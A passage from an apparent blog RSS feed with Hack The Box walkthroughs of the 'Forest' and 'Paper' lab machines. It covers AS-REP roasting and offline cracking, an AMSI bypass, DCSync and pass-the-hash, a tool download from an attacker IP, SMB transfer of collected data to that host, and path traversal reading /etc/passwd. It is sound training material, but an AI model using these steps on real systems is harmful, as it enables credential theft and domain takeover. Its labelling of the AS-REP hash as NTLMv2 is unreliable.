Computer name: FOREST | NetBIOS computer name: FOREST\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2022-06-13T01:57:38-07:00 OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) Lets enumerate users. For the user enumeration, we can search for objectClass as person and search for sAMAccountName:.</description>
            <content type="html"><![CDATA[<h1 id="forest">Forest</h1>
<p>
    <img src="/images/htb/banner.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/Forest/2023-10-18_19-30.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">nmap</h3>
<p>Initian enumeration with nmap</p>

    <img src="/images/htb/Forest/Untitled.png"  class="center"  style="border-radius: 10px;"  />


<p>Some usefull information:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Computer name: FOREST
|   NetBIOS computer name: FOREST<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-06-13T01:57:38-07:00

OS: Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2016</span> Standard 6.3

3268/tcp open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: htb.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>

</code></pre></div><p>Lets enumerate users. For the user enumeration, we can search for <code>objectClass</code> as person and search for <code>sAMAccountName:</code>.</p>
<h3 id="users">Users</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">=======================================(</span> Users on 10.129.95.210 <span style="color:#f92672">)=======================================</span>
user:<span style="color:#f92672">[</span>Administrator<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f4<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>Guest<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>krbtgt<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f6<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>DefaultAccount<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f7<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>$331000-VK4ADACQNUCA<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x463<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_2c8eef0a09b545acb<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x464<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_ca8c2ed5bdab4dc9b<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x465<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_75a538d3025e4db9a<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x466<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_681f53d4942840e18<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x467<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_1b41c9286325456bb<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x468<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_9b69f1b9d2cc45549<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x469<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_7c96b981967141ebb<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46a<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_c75ee099d0a64c91b<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46b<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>SM_1ffab36a2f5f479cb<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46c<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailboxc3d7722<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46e<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailboxfc9daad<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46f<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailboxc0a90c9<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x470<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailbox670628e<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x471<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailbox968e74d<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x472<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailbox6ded678<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x473<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailbox83d6781<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x474<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailboxfd87238<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x475<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailboxb01ac64<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x476<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailbox7108a4e<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x477<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>HealthMailbox0659cc1<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x478<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>sebastien<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x479<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>lucinda<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47a<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>svc-alfresco<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47b<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>andy<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47e<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>mark<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x47f<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>santi<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x480<span style="color:#f92672">]</span>
</code></pre></div><h2 id="asreproast">ASREPRoast</h2>
<blockquote>
<p><em><strong>EXPLANATION- For the user accounts that are enabled with no pre-Authentication,(basically Kerberos pre-authentication is disabled) it’s vulnerable to AS-REP Roasting attack. We can request for that user’s Kerberos TGT ticket without providing any authentication, and the TGT ticket which we will get back will be encrypted with the account’s password. So we can crack the hash offline.Using the Impacket’s GetNPUsers.py script, we can do the attack:</strong></em></p>
</blockquote>
<p>Save the list of users in a file, and lets use <code>GetNPUsers.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GetNPUsers.py htb.local/ -no-pass -usersfile users    
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation

<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Client not found in Kerberos database<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User lucinda doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span><span style="color:#e6db74">$krb5asrep$23$svc-alfresco@HTB.LOCAL:28a1170a7195863540958b52e6bbb280$d4652fa91e48bbd92d0ab6e48587a387facdd084a00e7b6af81269add267b96ba8d96e1cabf89c5cef9dfa036407d43fb111358a68a8a2a2cc289177d6f6778e40aba64ec828fd108050edbbe7aacfa098897f8012539de5aec2921234790474b73773b291561b3b775117ea23e8ac3a969db66fb99e8156fd89e00c4769b548e597030639d1cc4433b3978782f75e1661a977680dfbc6cefc08354b01c253669d9af8ad6abe3e5c55742d99a9d5c1787b1c1019f23b20dca3a6ff806be411d06b2c0efae4e2357452ed943520019020e7d951bd6bd2de6d02cd66079120233d1e718e8a561d
</span><span style="color:#e6db74">[-] User andy doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User mark doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span><span style="color:#e6db74">[-] User santi doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
</code></pre></div><h3 id="cracking-the-password">Cracking the Password</h3>
<p>The Kerberos pre-authentication for the user <em>svc-alfresco</em> is turned off, and the KDC provided a TGT encrypted using the user&rsquo;s password.</p>
<p>Store the encrypted TGT in a file named hash.txt. We&rsquo;ll then decrypt it using hashcat. Given that the hash is of type NTLMv2, we&rsquo;ll utilize the -m 18200 flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash     
Using default input encoding: UTF-8
Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>krb5asrep, Kerberos <span style="color:#ae81ff">5</span> AS-REP etype 17/18/23 <span style="color:#f92672">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x<span style="color:#f92672">])</span>
Will run <span style="color:#ae81ff">4</span> OpenMP threads
Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
s3rvice          <span style="color:#f92672">(</span>$krb5asrep$23$svc-alfresco@HTB.LOCAL<span style="color:#f92672">)</span>     
1g 0:00:00:28 DONE <span style="color:#f92672">(</span>2022-06-13 05:21<span style="color:#f92672">)</span> 0.03519g/s 143814p/s 143814c/s 143814C/s s401447401447401447..s3r2s1
Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div><!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>Testing the credentials:</p>

    <img src="/images/htb/Forest/Untitled%201.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/Forest/Untitled%202.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="connection">Connection</h2>
<p>The password of the user <strong>svc-alfresco</strong> is <strong>s3rvice</strong>. Now since we have the svc-alfresco’s password we can log in using <strong>crackmapexecor evil-winrm</strong> to gain initial foothold.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
</code></pre></div><p>Getting user flag:</p>

    <img src="/images/htb/Forest/Untitled%203.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="local-enumeration">Local enumeration</h3>
<p>Copy sharphound.exe to the machine:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Powershell.exe -ExecutionPolicy Bypass Invoke-WebRequest <span style="color:#e6db74">&#34;http://10.10.16.13/sharphound.exe&#34;</span> -OutFile <span style="color:#e6db74">&#34;sharp.exe&#34;</span>
</code></pre></div><p>Execute:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./sharp.exe -c all --zipfilename forest.zip
</code></pre></div>
    <img src="/images/htb/Forest/Untitled%204.png"  class="center"  style="border-radius: 10px;"  />


<p>Open a smb server to file transfer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbserver.py -comment SHARE -username test -password test -ip 10.10.14.8 -port <span style="color:#ae81ff">445</span> -smb2support SHARE ./
</code></pre></div><p>Map the drive and copy the file</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">net use y: <span style="color:#ae81ff">\\</span>10.10.14.8<span style="color:#ae81ff">\S</span>HARE /user:test test
copy 20220613040930_file.zip y:
</code></pre></div><p>Drag the zip into the bloodhound</p>

    <img src="/images/htb/Forest/Untitled%205.png"  class="center"  style="border-radius: 10px;"  />


<p>Use the query “Shortest Paths to Domain Admins from Owned Principals”</p>

    <img src="/images/htb/Forest/Untitled%206.png"  class="center"  style="border-radius: 10px;"  />


<p>Use the query “Shortestpaths to high value targets”</p>

    <img src="/images/htb/Forest/Untitled%207.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/Forest/Untitled%208.png"  class="center"  style="border-radius: 10px;"  />


<p>One of the paths shows that the Exchange Windows Permissions group has WriteDACL privileges on the Domain. The WriteDACL privilege allows a user to add ACLs to an object. This implies that we can include a user in this group and grant them DCSync rights.</p>
<h2 id="dcsync---exploit">DCSync - Exploit</h2>
<p>Crete a new user and set the group:</p>

    <img src="/images/htb/Forest/Untitled%209.png"  class="center"  style="border-radius: 10px;"  />


<p>Copy PowerView to the host and run Bypass-AMSI.</p>
<p>The Bypass-AMSI command is used to bypass Defender before importing the script. Next, we can use the Add-ObjectACL with John&rsquo;s credentials, and grant him DCSync rights.</p>
<p>Assigning DCSync rights to the user:</p>

    <img src="/images/htb/Forest/Untitled%2010.png"  class="center"  style="border-radius: 10px;"  />


<p>Dump the credentials:</p>

    <img src="/images/htb/Forest/Untitled%2011.png"  class="center"  style="border-radius: 10px;"  />


<p>I attempted cracking without success, so I resorted to using pass the hash with <code>psexec</code></p>

    <img src="/images/htb/Forest/image.png"  class="center"  style="border-radius: 10px;"  />


<p>Getting root flag:</p>

    <img src="/images/htb/Forest/Untitled%2013.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/Forest/Untitled%2014.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>Hack the Box - Paper - Write Up</title>
            <link>https://nmmorette.github.io/posts/2022/04/hack-the-box-paper-write-up/</link>
            <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2022/04/hack-the-box-paper-write-up/</guid>
            <description>Paper Enumeration Launching Nmap: The journey begins with the execution of Nmap. This versatile tool offers a plethora of scanning options.
sudo nmap -sS 10.129.153.125 -A -p22,80,443 Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-04 13:30 -03 Nmap scan report for 10.129.153.125 Host is up (0.32s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) | ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA) | 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA) |_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519) 80/tcp open http Apache httpd 2.</description>
            <content type="html"><![CDATA[<h1 id="paper">Paper</h1>
<p>
    <img src="/images/htb/banner.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/Paper/Untitled.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h1 id="enumeration">Enumeration</h1>
<p><strong>Launching Nmap:</strong> The journey begins with the execution of Nmap. This versatile tool offers a plethora of scanning options.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sS 10.129.153.125 -A -p22,80,443
Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-04-04 13:30 -03
Nmap scan report <span style="color:#66d9ef">for</span> 10.129.153.125
Host is up <span style="color:#f92672">(</span>0.32s latency<span style="color:#f92672">)</span>.

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp  open  http     Apache httpd 2.4.37 <span style="color:#f92672">((</span>centos<span style="color:#f92672">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9<span style="color:#f92672">)</span>
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy <span style="color:#66d9ef">for</span> HTML5 <span style="color:#66d9ef">for</span> Linux version 5.7.28
|_http-server-header: Apache/2.4.37 <span style="color:#f92672">(</span>centos<span style="color:#f92672">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 <span style="color:#f92672">((</span>centos<span style="color:#f92672">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9<span style="color:#f92672">)</span>
|_http-generator: HTML Tidy <span style="color:#66d9ef">for</span> HTML5 <span style="color:#66d9ef">for</span> Linux version 5.7.28
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost.localdomain/organizationName<span style="color:#f92672">=</span>Unspecified/countryName<span style="color:#f92672">=</span>US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 <span style="color:#f92672">(</span>centos<span style="color:#f92672">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9
| tls-alpn: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
Aggressive OS guesses: Linux 3.2 - 4.9 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.2 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span>Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>94%<span style="color:#f92672">)</span>, Linux 3.18 <span style="color:#f92672">(</span>94%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Adtran 424RG FTTH gateway <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Linux 2.6.39 - 3.2 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>
No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
Network Distance: <span style="color:#ae81ff">2</span> hops

TRACEROUTE <span style="color:#f92672">(</span>using port 443/tcp<span style="color:#f92672">)</span>
HOP RTT       ADDRESS
<span style="color:#ae81ff">1</span>   335.76 ms 10.10.16.1
<span style="color:#ae81ff">2</span>   338.60 ms 10.129.153.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 35.13 seconds
</code></pre></div><h2 id="http-80">HTTP 80</h2>
<p>Now, we can enumerate port 80 using other tools based on the ‘nmap’  results.</p>
<h3 id="nikto">nikto</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nikto -h http://10.129.153.125
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.153.125
+ Target Hostname:    10.129.153.125
+ Target Port:        <span style="color:#ae81ff">80</span>
+ Start Time:         2022-04-04 13:31:14 <span style="color:#f92672">(</span>GMT-3<span style="color:#f92672">)</span>
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 <span style="color:#f92672">(</span>centos<span style="color:#f92672">)</span> OpenSSL/1.1.1k mod_fcgid/2.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header <span style="color:#e6db74">&#39;x-backend-server&#39;</span> found, with contents: office.paper
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ <span style="color:#ae81ff">8727</span> requests: <span style="color:#ae81ff">0</span> error<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">11</span> item<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> reported on remote host
+ End Time:           2022-04-04 13:58:20 <span style="color:#f92672">(</span>GMT-3<span style="color:#f92672">)</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">1626</span> seconds<span style="color:#f92672">)</span>
---------------------------------------------------------------------------
+ <span style="color:#ae81ff">1</span> host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> tested
</code></pre></div><p>I discovered a header named &lsquo;office.paper&rsquo; in the &lsquo;nikto&rsquo; scan results. To access the corresponding webpage in a browser, we should add the host IP address associated with this header to the &lsquo;etc/hosts&rsquo; file.</p>

    <img src="/images/htb/Paper/Untitled%201.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="wordpress">WordPress</h3>
<p>I utilized the tool ‘Wappalyzer’ to analyze the webpage and discovered it&rsquo;s built with WordPress. By navigating through some default WordPress PHP pages, I successfully reached the login page at: <a href="http://office.paper/wp-login.php" target="_blank" >http://office.paper/wp-login.php</a>.</p>

    <img src="/images/htb/Paper/Untitled%202.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="information-disclousure">Information Disclousure</h3>
<p>While examining the comments section of the page, I discovered some possible usernames.</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->

    <img src="/images/htb/Paper/Untitled%203.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/Paper/Untitled%204.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="searchsploit">Searchsploit</h3>
<p>Search for wordpress exploits</p>

    <img src="/images/htb/Paper/Untitled%205.png"  class="center"  style="border-radius: 10px;"  />


<p>I came across a new link that leads to a chat bot.</p>

    <img src="/images/htb/Paper/Untitled%206.png"  class="center"  style="border-radius: 10px;"  />


<!-- raw HTML omitted -->
<!-- raw HTML omitted -->

    <img src="/images/htb/Paper/Untitled%207.png"  class="center"  style="border-radius: 10px;"  />


<p>I couldn&rsquo;t find any existing user/password combinations, so I opted to create a new user instead</p>
<p>After logging in, I was able to interact with the chat bot and attempt to read some files</p>

    <img src="/images/htb/Paper/Untitled%208.png"  class="center"  style="border-radius: 10px;"  />


<p>Cant read the dwight file:</p>

    <img src="/images/htb/Paper/Untitled%209.png"  class="center"  style="border-radius: 10px;"  />


<p>I attempted several Operating System (OS) injection techniques</p>

    <img src="/images/htb/Paper/Untitled%2010.png"  class="center"  style="border-radius: 10px;"  />


<p>Following that, I experimented with a Local File Inclusion (LFI) syntax.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">recyclops file ../../../../../../../etc/passwd

&lt;!<span style="color:#f92672">=====</span>Contents of file ../../../../../../../etc/passwd<span style="color:#f92672">=====</span>&gt;
root❌0:0:root:/root:/bin/bash
bin❌1:1:bin:/bin:/sbin/nologin
daemon❌2:2:daemon:/sbin:/sbin/nologin
adm❌3:4:adm:/var/adm:/sbin/nologin
lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
sync❌5:0:sync:/sbin:/bin/sync
shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
halt❌7:0:halt:/sbin:/sbin/halt
mail❌8:12:mail:/var/spool/mail:/sbin/nologin
operator❌11:0:operator:/root:/sbin/nologin
games❌12💯games:/usr/games:/sbin/nologin
ftp❌14:50:FTP User:/var/ftp:/sbin/nologin
nobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin
dbus❌81:81:System message bus:/:/sbin/nologin
systemd-coredump❌999:997:systemd Core Dumper:/:/sbin/nologin
systemd-resolve❌193:193:systemd Resolver:/:/sbin/nologin
tss❌59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
polkitd❌998:996:User <span style="color:#66d9ef">for</span> polkitd:/:/sbin/nologin
geoclue❌997:994:User <span style="color:#66d9ef">for</span> geoclue:/var/lib/geoclue:/sbin/nologin
rtkit❌172:172:RealtimeKit:/proc:/sbin/nologin
qemu❌107:107:qemu user:/:/sbin/nologin
apache❌48:48:Apache:/usr/share/httpd:/sbin/nologin
cockpit-ws❌996:993:User <span style="color:#66d9ef">for</span> cockpit-ws:/:/sbin/nologin
pulse❌171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
usbmuxd❌113:113:usbmuxd user:/:/sbin/nologin
unbound❌995:990:Unbound DNS resolver:/etc/unbound:/sbin/nologin
rpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
gluster❌994:989:GlusterFS daemons:/run/gluster:/sbin/nologin
chrony❌993:987::/var/lib/chrony:/sbin/nologin
libstoragemgmt❌992:986:daemon account <span style="color:#66d9ef">for</span> libstoragemgmt:/var/run/lsm:/sbin/nologin
saslauth❌991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
dnsmasq❌985:985:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
radvd❌75:75:radvd user:/:/sbin/nologin
clevis❌984:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin
pegasus❌66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
sssd❌983:981:User <span style="color:#66d9ef">for</span> sssd:/:/sbin/nologin
colord❌982:980:User <span style="color:#66d9ef">for</span> colord:/var/lib/colord:/sbin/nologin
rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
setroubleshoot❌981:979::/var/lib/setroubleshoot:/sbin/nologin
pipewire❌980:978:PipeWire System Daemon:/var/run/pipewire:/sbin/nologin
gdm❌42:42::/var/lib/gdm:/sbin/nologin
gnome-initial-setup❌979:977::/run/gnome-initial-setup/:/sbin/nologin
insights❌978:976:Red Hat Insights:/var/lib/insights:/sbin/nologin
sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
avahi❌70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
tcpdump❌72:72::/:/sbin/nologin
mysql❌27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
nginx❌977:975:Nginx web server:/var/lib/nginx:/sbin/nologin
mongod❌976:974:mongod:/var/lib/mongo:/bin/false
rocketchat❌1001:1001::/home/rocketchat:/bin/bash
dwight❌1004:1004::/home/dwight:/bin/bash
&lt;!<span style="color:#f92672">=====</span>End of file ../../../../../../../etc/passwd<span style="color:#f92672">=====</span>&gt;
</code></pre></div><p>Listing files:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">recyclops list ../

drwx------ <span style="color:#ae81ff">11</span> dwight dwight <span style="color:#ae81ff">281</span> Feb <span style="color:#ae81ff">6</span> 07:55 .
drwxr-xr-x. <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">20</span> Jan <span style="color:#ae81ff">14</span> 06:50 ..
